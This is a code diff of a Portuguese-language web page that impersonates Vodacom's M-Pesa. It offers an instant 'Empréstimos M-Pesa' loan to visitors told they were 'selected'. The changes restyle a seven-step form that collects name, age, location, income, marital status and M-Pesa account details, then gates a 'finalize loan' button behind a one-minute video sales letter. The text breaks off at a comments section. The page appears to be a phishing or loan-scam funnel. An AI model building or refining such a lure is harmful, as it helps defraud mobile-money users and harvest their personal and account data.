@@ -28,148 +28,154 @@
         .live-pulse {
             animation: pulse-dot 1.5s infinite;
         }
+        .step-content {
+            transition: all 0.3s ease-in-out;
+        }
     </style>
 </head>
-<body class="bg-gray-50 text-gray-800 min-h-screen flex flex-col justify-between font-sans">
+<body class="bg-gradient-to-br from-gray-50 to-gray-100 text-gray-800 min-h-screen flex flex-col justify-between font-sans antialiased">
 
     <!-- Top Header -->
-    <header class="bg-white shadow-sm border-b border-gray-100 py-3 px-4 flex items-center justify-between sticky top-0 z-50">
-        <div class="flex items-center space-x-2">
+    <header class="bg-white/90 backdrop-blur-md shadow-sm border-b border-gray-100 py-3 px-4 flex items-center justify-between sticky top-0 z-50">
+        <div class="flex items-center space-x-2.5">
             <a href="https://ibb.co/h3yB1Mw" target="_blank">
                 <img src="https://i.ibb.co/h3yB1Mw/mpesa-logo-E-5cvo-S6.png" alt="mpesa-logo" border="0" class="h-8 w-auto">
             </a>
             <span class="font-bold text-gray-800 text-sm tracking-tight">Vodacom | M-Pesa</span>
         </div>
-        <div class="flex items-center space-x-2 bg-red-50 border border-red-200 px-2.5 py-1 rounded-full">
+        <div class="flex items-center space-x-2 bg-red-50 border border-red-200 px-3 py-1 rounded-full shadow-2xs">
             <span class="w-2.5 h-2.5 bg-vodared rounded-full live-pulse inline-block"></span>
-            <span class="text-xs font-semibold text-vodared tracking-wide uppercase">ao vivo</span>
+            <span class="text-xs font-semibold text-vodared tracking-wider uppercase">ao vivo</span>
         </div>
     </header>
 
     <!-- Main Content Container -->
     <main class="flex-grow flex items-center justify-center p-4">
-        <div class="w-full max-w-md bg-white rounded-2xl shadow-lg border border-gray-100 overflow-hidden my-4">
+        <div class="w-full max-w-md bg-white rounded-3xl shadow-xl border border-gray-100/80 overflow-hidden my-4 transition-all">
 
             <!-- STEP 0: Welcome Screen -->
-            <div id="step-0" class="step-content p-6 text-center">
+            <div id="step-0" class="step-content p-8 text-center">
                 <div class="flex justify-center mb-6">
-                    <img src="https://i.ibb.co/h3yB1Mw/mpesa-logo-E-5cvo-S6.png" alt="M-Pesa Logo" class="h-16 w-auto drop-shadow-md">
+                    <div class="p-3 bg-red-50 rounded-2xl shadow-inner">
+                        <img src="https://i.ibb.co/h3yB1Mw/mpesa-logo-E-5cvo-S6.png" alt="M-Pesa Logo" class="h-16 w-auto drop-shadow-md">
+                    </div>
                 </div>
-                <h1 class="text-2xl font-extrabold text-gray-900 mb-3 leading-snug">Você foi selecionado!</h1>
+                <span class="bg-red-100 text-vodared text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider">Nova Oportunidade</span>
+                <h1 class="text-2xl font-extrabold text-gray-900 mt-3 mb-3 leading-snug">Você foi selecionado!</h1>
                 <p class="text-gray-600 text-sm mb-8 leading-relaxed">
-                    Estás prestes a ativar o novo serviço da Vodacom, o Emprestimos M-Pesa, siga as instruções abaixo.
+                    Estás prestes a ativar o novo serviço da Vodacom, o Empréstimos M-Pesa. Siga as instruções abaixo para receber o saldo instantaneamente.
                 </p>
-                <button type="button" id="btn-comecar" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-base cursor-pointer">
-                    Começar
+                <button type="button" id="btn-comecar" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-red-500/30 transition duration-200 text-base cursor-pointer">
+                    Começar Agora
                 </button>
             </div>
 
             <!-- Progress Bar Header (Steps 1-7) -->
-            <div id="progress-header" class="hidden px-6 pt-6 pb-2 border-b border-gray-100">
+            <div id="progress-header" class="hidden px-6 pt-6 pb-3 border-b border-gray-100 bg-gray-50/50">
                 <div class="flex justify-between items-center mb-2">
-                    <button type="button" id="btn-voltar" class="text-xs text-gray-500 hover:text-gray-800 flex items-center font-medium cursor-pointer">
+                    <button type="button" id="btn-voltar" class="text-xs text-gray-500 hover:text-gray-800 flex items-center font-medium cursor-pointer transition">
                         ← Voltar
                     </button>
-                    <span id="step-counter" class="text-xs font-semibold text-vodared">Etapa 1 de 7</span>
+                    <span id="step-counter" class="text-xs font-bold text-vodared tracking-wide">Etapa 1 de 7</span>
                 </div>
                 <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
-                    <div id="progress-bar" class="bg-vodared h-full transition-all duration-300" style="width: 14%;"></div>
+                    <div id="progress-bar" class="bg-vodared h-full transition-all duration-500 rounded-full" style="width: 14%;"></div>
                 </div>
             </div>
 
             <!-- STEP 1: Nome Completo -->
-            <div id="step-1" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Qual é o seu nome completo?</h2>
-                <p class="text-xs text-gray-500 mb-6">Insira o seu nome registado no documento de identificação.</p>
-                
-                <div class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Nome Completo</label>
-                        <input type="text" id="input-nome" placeholder="Ex: Maria João Mondlane" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm">
-                    </div>
-                    <button type="button" id="btn-step1" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-4 cursor-pointer">
-                        Continuar
-                    </button>
+            <div id="step-1" class="step-content hidden p-6 space-y-4">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Qual é o seu nome completo?</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Insira o seu nome registado no documento de identificação.</p>
                 </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1.5">Nome Completo</label>
+                    <input type="text" id="input-nome" placeholder="Ex: Maria João Mondlane" class="w-full px-4 py-3.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-gray-50/50">
+                </div>
+                <button type="button" id="btn-step1" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-md transition duration-200 text-sm cursor-pointer mt-2">
+                    Continuar
+                </button>
             </div>
 
             <!-- STEP 2: Perfil (Onde vive e Idade) -->
-            <div id="step-2" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Perfil</h2>
-                <p class="text-xs text-gray-500 mb-6">Onde vive e qual é a sua idade?</p>
-                
-                <div class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Em que localidade vive?</label>
-                        <input type="text" id="input-localidade" placeholder="Ex: Maputo, Matola, Beira..." class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é a sua idade?</label>
-                        <input type="number" id="input-idade" placeholder="Ex: 28" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm">
-                    </div>
-                    <button type="button" id="btn-step2" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-4 cursor-pointer">
-                        Continuar
-                    </button>
+            <div id="step-2" class="step-content hidden p-6 space-y-4">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Perfil</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Onde vive e qual é a sua idade?</p>
                 </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1.5">Em que localidade vive?</label>
+                    <input type="text" id="input-localidade" placeholder="Ex: Maputo, Matola, Beira..." class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-gray-50/50">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1.5">Qual é a sua idade?</label>
+                    <input type="number" id="input-idade" placeholder="Ex: 28" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-gray-50/50">
+                </div>
+                <button type="button" id="btn-step2" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-md transition duration-200 text-sm cursor-pointer mt-2">
+                    Continuar
+                </button>
             </div>
 
             <!-- STEP 3: Valor -->
-            <div id="step-3" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Valor</h2>
-                <p class="text-xs text-gray-500 mb-4">Quanto pretende solicitar? <br><span class="text-vodared font-medium">Valores permitidos: MT 70 até MT 5.000.</span></p>
-                
-                <div class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Valor em Meticais (MT)</label>
-                        <input type="number" id="input-valor" placeholder="Ex: 1500" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm font-semibold text-gray-900">
-                    </div>
-                    <div class="grid grid-cols-2 gap-2">
-                        <button type="button" onclick="setValor(500)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 500</button>
-                        <button type="button" onclick="setValor(1500)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 1500</button>
-                        <button type="button" onclick="setValor(3000)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 3000</button>
-                        <button type="button" onclick="setValor(5000)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 5000</button>
-                    </div>
-                    <button type="button" id="btn-step3" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-4 cursor-pointer">
-                        Continuar
-                    </button>
+            <div id="step-3" class="step-content hidden p-6 space-y-4">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Valor</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Quanto pretende solicitar? <span class="text-vodared font-semibold block mt-1">Valores permitidos: MT 70 até MT 5.000.</span></p>
                 </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1.5">Valor em Meticais (MT)</label>
+                    <input type="number" id="input-valor" placeholder="Ex: 1500" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm font-semibold text-gray-900 bg-gray-50/50">
+                </div>
+                <div class="grid grid-cols-2 gap-2">
+                    <button type="button" onclick="setValor(500)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 500</button>
+                    <button type="button" onclick="setValor(1500)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 1500</button>
+                    <button type="button" onclick="setValor(3000)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 3000</button>
+                    <button type="button" onclick="setValor(5000)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition cursor-pointer">MT 5000</button>
+                </div>
+                <button type="button" id="btn-step3" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-md transition duration-200 text-sm cursor-pointer mt-2">
+                    Continuar
+                </button>
             </div>
 
             <!-- STEP 4: Prazo -->
-            <div id="step-4" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Prazo</h2>
-                <p class="text-xs text-gray-500 mb-6">Quando pretende solicitar o valor?</p>
-                
+            <div id="step-4" class="step-content hidden p-6 space-y-4">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Prazo</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Quando pretende solicitar o valor?</p>
+                </div>
                 <div class="space-y-2.5">
-                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                    <label class="flex items-center p-3.5 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50/50 hover:border-vodared transition">
                         <input type="radio" name="prazo" value="Hoje" class="text-vodared focus:ring-vodared h-4 w-4" checked>
                         <span class="ml-3 text-sm font-medium text-gray-700">Hoje</span>
                     </label>
-                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                    <label class="flex items-center p-3.5 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50/50 hover:border-vodared transition">
                         <input type="radio" name="prazo" value="Nos próximos 3 dias" class="text-vodared focus:ring-vodared h-4 w-4">
                         <span class="ml-3 text-sm font-medium text-gray-700">Nos próximos 3 dias</span>
                     </label>
-                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                    <label class="flex items-center p-3.5 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50/50 hover:border-vodared transition">
                         <input type="radio" name="prazo" value="Nesta semana" class="text-vodared focus:ring-vodared h-4 w-4">
                         <span class="ml-3 text-sm font-medium text-gray-700">Nesta semana</span>
                     </label>
-                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                    <label class="flex items-center p-3.5 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50/50 hover:border-vodared transition">
                         <input type="radio" name="prazo" value="Ainda estou a avaliar" class="text-vodared focus:ring-vodared h-4 w-4">
                         <span class="ml-3 text-sm font-medium text-gray-700">Ainda estou a avaliar</span>
                     </label>
                 </div>
-                <button type="button" id="btn-step4" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-6 cursor-pointer">
+                <button type="button" id="btn-step4" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-md transition duration-200 text-sm cursor-pointer mt-4">
                     Continuar
                 </button>
             </div>
 
             <!-- STEP 5: Finalidade & Fonte -->
-            <div id="step-5" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Finalidade</h2>
-                <p class="text-xs text-gray-500 mb-4">Para que pretende utilizar o dinheiro?</p>
-                
-                <div class="space-y-4 mb-6">
-                    <select id="select-finalidade" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-white">
+            <div id="step-5" class="step-content hidden p-6 space-y-4">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Finalidade & Rendimento</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Detalhe a utilização e origem dos fundos.</p>
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1.5">Para que pretende utilizar o dinheiro?</label>
+                    <select id="select-finalidade" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-gray-50/50">
                         <option value="Despesas pessoais">Despesas pessoais</option>
                         <option value="Negócio">Negócio</option>
                         <option value="Alimentação">Alimentação</option>
@@ -178,393 +184,211 @@
                         <option value="Contas">Contas</option>
                         <option value="Outro">Outro</option>
                     </select>
-
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é a sua principal fonte de rendimento?</label>
-                        <select id="select-fonte" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-white">
-                            <option value="Emprego">Emprego</option>
-                            <option value="Negócio próprio">Negócio próprio</option>
-                            <option value="Trabalho informal">Trabalho informal</option>
-                            <option value="Agricultura">Agricultura</option>
-                            <option value="Trabalho por conta própria">Trabalho por conta própria</option>
-                            <option value="Outra">Outra</option>
-                        </select>
-                    </div>
                 </div>
-                <button type="button" id="btn-step5" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm cursor-pointer">
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1.5">Qual é a sua principal fonte de rendimento?</label>
+                    <select id="select-fonte" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-gray-50/50">
+                        <option value="Emprego">Emprego</option>
+                        <option value="Negócio próprio">Negócio próprio</option>
+                        <option value="Trabalho informal">Trabalho informal</option>
+                        <option value="Agricultura">Agricultura</option>
+                        <option value="Trabalho por conta própria">Trabalho por conta própria</option>
+                        <option value="Outra">Outra</option>
+                    </select>
+                </div>
+                <button type="button" id="btn-step5" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-md transition duration-200 text-sm cursor-pointer mt-2">
                     Continuar
                 </button>
             </div>
 
             <!-- STEP 6: Últimos dados -->
-            <div id="step-6" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Últimos dados</h2>
-                <p class="text-xs text-gray-500 mb-4">Informações finais para liberação do saldo.</p>
-                
-                <div class="space-y-4 mb-6">
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Quanto consegue ganhar aproximadamente por mês?</label>
-                        <select id="select-rendimento" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-white">
-                            <option value="Menos de MT 5.000">Menos de MT 5.000</option>
-                            <option value="MT 5.000 – 10.000">MT 5.000 – 10.000</option>
-                            <option value="MT 10.001 – 20.000">MT 10.001 – 20.000</option>
-                            <option value="Mais de MT 20.000">Mais de MT 20.000</option>
-                        </select>
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é o seu estado civil?</label>
-                        <select id="select-estadocivil" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-white">
-                            <option value="Solteiro(a)">Solteiro(a)</option>
-                            <option value="Casado(a)">Casado(a)</option>
-                            <option value="União de facto">União de facto</option>
-                            <option value="Divorciado(a)">Divorciado(a)</option>
-                            <option value="Viúvo(a)">Viúvo(a)</option>
-                        </select>
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Número M-Pesa a receber o empréstimo</label>
-                        <input type="tel" id="input-numero" placeholder="Ex: 84XXXXXXX / 85XXXXXXX" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-medium text-gray-700 mb-1">Nome do seu M-Pesa</label>
-                        <input type="text" id="input-nomempesa" placeholder="Nome titular da conta M-Pesa" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs">
-                    </div>
+            <div id="step-6" class="step-content hidden p-6 space-y-3.5">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Últimos dados</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Informações finais para liberação do saldo.</p>
                 </div>
-                <button type="button" id="btn-step6" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm cursor-pointer">
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1">Rendimento aproximado por mês?</label>
+                    <select id="select-rendimento" class="w-full px-3.5 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-gray-50/50">
+                        <option value="Menos de MT 5.000">Menos de MT 5.000</option>
+                        <option value="MT 5.000 – 10.000">MT 5.000 – 10.000</option>
+                        <option value="MT 10.001 – 20.000">MT 10.001 – 20.000</option>
+                        <option value="Mais de MT 20.000">Mais de MT 20.000</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1">Estado civil?</label>
+                    <select id="select-estadocivil" class="w-full px-3.5 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-gray-50/50">
+                        <option value="Solteiro(a)">Solteiro(a)</option>
+                        <option value="Casado(a)">Casado(a)</option>
+                        <option value="União de facto">União de facto</option>
+                        <option value="Divorciado(a)">Divorciado(a)</option>
+                        <option value="Viúvo(a)">Viúvo(a)</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1">Número M-Pesa para receber o empréstimo</label>
+                    <input type="tel" id="input-numero" placeholder="Ex: 84XXXXXXX / 85XXXXXXX" class="w-full px-3.5 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-gray-50/50">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1">Nome registado no M-Pesa</label>
+                    <input type="text" id="input-nomempesa" placeholder="Nome titular da conta" class="w-full px-3.5 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-gray-50/50">
+                </div>
+                <button type="button" id="btn-step6" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-md transition duration-200 text-sm cursor-pointer mt-2">
                     Ver resumo
                 </button>
             </div>
 
             <!-- STEP 7: Resumo -->
-            <div id="step-7" class="step-content hidden p-6">
-                <h2 class="text-lg font-bold text-gray-900 mb-1">Resumo</h2>
-                <p class="text-xs text-gray-500 mb-4">Confirme os seus dados antes de prosseguir.</p>
-                
-                <div class="bg-gray-50 border border-gray-200 rounded-xl p-4 text-xs space-y-2 mb-6 max-h-60 overflow-y-auto">
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Nome:</span> <span id="res-nome" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Localidade:</span> <span id="res-localidade" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Idade:</span> <span id="res-idade" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Valor:</span> <span id="res-valor" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Quando pretende:</span> <span id="res-prazo" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Finalidade:</span> <span id="res-finalidade" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Fonte de rendimento:</span> <span id="res-fonte" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Rendimento mensal:</span> <span id="res-rendimento" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Estado civil:</span> <span id="res-estadocivil" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Número M-Pesa:</span> <span id="res-numero" class="font-medium text-gray-800">--</span></div>
-                    <div class="flex justify-between"><span class="text-gray-500">Nome M-Pesa:</span> <span id="res-nomempesa" class="font-medium text-gray-800">--</span></div>
+            <div id="step-7" class="step-content hidden p-6 space-y-4">
+                <div>
+                    <h2 class="text-lg font-bold text-gray-900">Resumo da Solicitação</h2>
+                    <p class="text-xs text-gray-500 mt-0.5">Confirme os seus dados antes de prosseguir.</p>
                 </div>
-
+                <div class="bg-gray-50 border border-gray-200/80 rounded-2xl p-4 text-xs space-y-2.5 max-h-56 overflow-y-auto">
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Nome:</span> <span id="res-nome" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Localidade:</span> <span id="res-localidade" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Idade:</span> <span id="res-idade" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Valor pretendido:</span> <span id="res-valor" class="font-semibold text-vodared">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Prazo:</span> <span id="res-prazo" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Finalidade:</span> <span id="res-finalidade" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Fonte:</span> <span id="res-fonte" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Rendimento:</span> <span id="res-rendimento" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Estado civil:</span> <span id="res-estadocivil" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-1.5"><span class="text-gray-500">Número M-Pesa:</span> <span id="res-numero" class="font-semibold text-gray-800">--</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">Titular M-Pesa:</span> <span id="res-nomempesa" class="font-semibold text-gray-800">--</span></div>
+                </div>
                 <button type="button" id="btn-step7" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-sm cursor-pointer">
-                    Continuar
+                    Confirmar e Assistir Vídeo
                 </button>
             </div>
 
             <!-- STEP 8: VSL (Video Sales Letter) Page with VTurb & Delayed Button -->
-            <div id="step-8" class="step-content hidden p-6">
-                <h2 class="text-xl font-bold text-gray-900 mb-2 text-center">Assista ao vídeo para liberar o seu Empréstimos M-Pesa</h2>
-                <p class="text-xs text-gray-600 mb-4 text-center">Veja o vídeo abaixo até ao fim para receber a solicitação de empréstimo diretamente no seu M-Pesa.</p>
+            <div id="step-8" class="step-content hidden p-6 space-y-4">
+                <div class="text-center">
+                    <h2 class="text-xl font-bold text-gray-900 leading-snug">Instruções de Liberação</h2>
+                    <p class="text-xs text-gray-600 mt-1">Assista ao vídeo abaixo até ao fim para receber o seu empréstimo diretamente no M-Pesa.</p>
+                </div>
 
                 <!-- VTurb Player Embed -->
-                <div class="mb-4 rounded-xl overflow-hidden shadow-md">
+                <div class="rounded-2xl overflow-hidden shadow-lg border border-gray-100 bg-black">
                     <vturb-smartplayer id="vid-6ad119cca2a8ffe04faeef29" style="display: block; margin: 0 auto; width: 100%;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 56.86274509803921% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
                     <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/2032284b-8ea9-43ac-b7c5-3d37319d8075/players/6ad119cca2a8ffe04faeef29/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
                 </div>
 
                 <!-- Botão Finalizar Empréstimo (Aparece após 1 minuto) -->
-                <div id="delayed-button-container" class="mb-5 hidden">
-                    <button type="button" id="btn-finalizar" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-base cursor-pointer animate-bounce">
-                        Finalizar Empréstimo
+                <div id="delayed-button-container" class="hidden">
+                    <button type="button" id="btn-finalizar" class="w-full bg-mpesagreen hover:bg-emerald-700 text-white font-bold py-4 px-6 rounded-2xl shadow-xl shadow-emerald-600/20 transition duration-200 text-base cursor-pointer animate-pulse">
+                        Finalizar Empréstimo ➔
                     </button>
                 </div>
-                <div id="timer-message" class="mb-5 text-center text-xs text-gray-500 bg-gray-100 p-3 rounded-xl">
-                    ⏳ O botão de finalização aparecerá após assistir às instruções (<span id="countdown">60</span>s)
+                <div id="timer-message" class="text-center text-xs text-gray-500 bg-gray-50 border border-gray-200/60 p-3 rounded-xl">
+                    ⏳ O botão de finalização aparecerá após o término da instrução (<span id="countdown" class="font-bold text-vodared">60</span>s)
                 </div>
 
                 <!-- Sound Alert Box -->
-                <div class="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 text-center">
-                    <p class="text-xs font-medium text-red-800 mb-2">Certifique-se de que o som está ligado</p>
-                    <button type="button" onclick="alert('Som ativado com sucesso!')" class="bg-vodared hover:bg-vodadark text-white text-xs font-bold py-2 px-4 rounded-lg shadow transition cursor-pointer">
+                <div class="bg-red-50 border border-red-200/80 rounded-2xl p-3 text-center">
+                    <p class="text-xs font-medium text-red-800 mb-2">Certifique-se de que o som está ligado 🔊</p>
+                    <button type="button" onclick="alert('Som ativado com sucesso!')" class="bg-vodared hover:bg-vodadark text-white text-xs font-bold py-2 px-4 rounded-xl shadow transition cursor-pointer">
                         Ligar o som do vídeo
                     </button>
                 </div>
 
-                <p class="text-[11px] text-gray-400 text-center mb-6">Veja o vídeo até ao fim para desbloquear o botão.</p>
-
                 <!-- Comments Section -->
-                <div class="border-t border-gray-100 pt-4">
-                    <h3 class="font-bold text-gray-800 text-sm mb-1">Comentários</h3>
-                    <p class="text-xs text-gray-500 mb-3">o que outros estão a dizer</p>
-                    
-                    <div class="flex items-center justify-between text-xs text-gray-600 mb-4 pb-2 border-b border-gray-100">
-                        <span class="font-semibold text-gray-800">5 Comentários</span>
